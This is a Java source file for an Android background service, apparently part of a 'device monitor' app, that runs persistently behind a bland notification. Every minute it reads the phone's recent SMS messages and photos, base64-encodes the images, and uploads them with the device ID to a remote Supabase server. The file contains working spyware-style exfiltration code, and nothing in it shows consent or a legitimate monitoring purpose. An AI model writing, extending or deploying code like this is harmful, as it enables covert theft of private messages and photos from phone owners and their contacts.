package com.monitor.smsphoto;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.MediaStore;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.util.Base64;

public class MonitorService extends Service {
    private static final String CHANNEL_ID = "monitor_service_channel";
    private static final int NOTIFICATION_ID = 1;

    private Handler handler = new Handler();

    private Runnable syncTask = new Runnable() {
        @Override
        public void run() {
            syncToSupabase();
            handler.postDelayed(this, 60000);
        }
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startInForeground();
        handler.post(syncTask);
        Log.d("MonitorService", "সার্ভিস শুরু হয়েছে");
        return START_STICKY;
    }

    private void startInForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Device Monitor", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("ডিভাইস মনিটর চলছে")
                .setContentText("ব্যাকগ্রাউন্ডে সিঙ্ক চলছে")
                .setSmallIcon(android.R.drawable.ic_popup_sync)
                .setOngoing(true)
                .build();

        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(NOTIFICATION_ID, notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }

    private void syncToSupabase() {
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        try {
            registerDevice(deviceId);

            JSONArray smsList = getSMS();
            for (int i = 0; i < smsList.length(); i++) {
                uploadSMS(deviceId, smsList.getJSONObject(i));
            }

            JSONArray photoList = getPhotos();
            for (int i = 0; i < photoList.length(); i++) {
                uploadPhoto(deviceId, photoList.getJSONObject(i));
            }

            Log.d("MonitorService", "সিঙ্ক সম্পন্ন: " + deviceId);
        } catch (Exception e) {
            Log.e("syncToSupabase", e.toString());
        }
    }

    private void registerDevice(String deviceId) throws Exception {
        String endpoint = Config.SUPABASE_URL + "/rest/v1/devices";
        JSONObject body = new JSONObject();
        body.put("device_id", deviceId);
        body.put("device_name", Build.MODEL);
        body.put("last_sync", new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'").format(new java.util.Date()));

        postToSupabase(endpoint, body.toString());
    }

    private void uploadSMS(String deviceId, JSONObject sms) throws Exception {
        String endpoint = Config.SUPABASE_URL + "/rest/v1/sms";
        JSONObject body = new JSONObject();
        body.put("device_id", deviceId);
        body.put("sender", sms.optString("sender", ""));
        body.put("body", sms.optString("body", ""));
        body.put("date", sms.optLong("date", 0));

        postToSupabase(endpoint, body.toString());
    }

    private void uploadPhoto(String deviceId, JSONObject photo) throws Exception {
        String endpoint = Config.SUPABASE_URL + "/rest/v1/photos";
        JSONObject body = new JSONObject();
        body.put("device_id", deviceId);
        body.put("photo_name", photo.optString("name", ""));
        body.put("photo_data", photo.optString("data", ""));

        postToSupabase(endpoint, body.toString());
    }

    private JSONArray getSMS() {
        JSONArray smsList = new JSONArray();
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) return smsList;

        try {
            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null,
                    "date DESC LIMIT 50");
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("sender", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    sms.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                    smsList.put(sms);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("getSMS", e.toString());
        }
        return smsList;
    }

    private JSONArray getPhotos() {
        JSONArray photoList = new JSONArray();
        String permission = Build.VERSION.SDK_INT >= 33
                ? android.Manifest.permission.READ_MEDIA_IMAGES
                : android.Manifest.permission.READ_EXTERNAL_STORAGE;
        if (ActivityCompat.checkSelfPermission(this, permission)
                != PackageManager.PERMISSION_GRANTED) return photoList;

        try {
            Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    new String[]{MediaStore.Images.Media.DATA, MediaStore.Images.Media.DISPLAY_NAME},
                    null, null, MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 20");
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String path = cursor.getString(0);
                    String name = cursor.getString(1);
                    File file = new File(path);
                    if (file.exists()) {
                        byte[] imageData = Files.readAllBytes(file.toPath());
                        String base64 = Base64.getEncoder().encodeToString(imageData);
                        JSONObject photo = new JSONObject();
                        photo.put("name", name);
                        photo.put("data", base64);
                        photoList.put(photo);
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("getPhotos", e.toString());
        }
        return photoList;
    }

    private void postToSupabase(String endpoint, String jsonData) throws Exception {
        URL url = new URL(endpoint);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("apikey", Config.SUPABASE_KEY);
        conn.setRequestProperty("Authorization", "Bearer " + Config.SUPABASE_KEY);
        conn.setDoOutput(true);

        OutputStream os = conn.getOutputStream();
        os.write(jsonData.getBytes());
        os.close();

        conn.getResponseCode();
        conn.disconnect();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        handler.removeCallbacks(syncTask);
        Log.d("MonitorService", "সার্ভিস বন্ধ হয়েছে");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
